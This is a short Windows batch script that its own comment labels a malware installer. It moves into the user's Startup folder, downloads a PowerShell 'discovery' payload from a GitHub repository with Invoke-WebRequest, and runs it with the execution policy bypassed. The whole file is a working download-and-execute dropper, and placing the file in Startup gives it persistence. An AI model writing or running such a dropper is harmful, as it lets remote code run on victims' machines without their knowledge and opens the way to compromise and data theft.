@rem Installer for the malware

@echo off
set "CurrentDirectory=%CD%"
set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM Change directory to startup
cd /d "%StartupDirectory%"

@REM Download required files
powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1' -o Test.ps1"

@REM Run the powershell discovery
powershell -ExecutionPolicy Bypass -File .\Test.ps1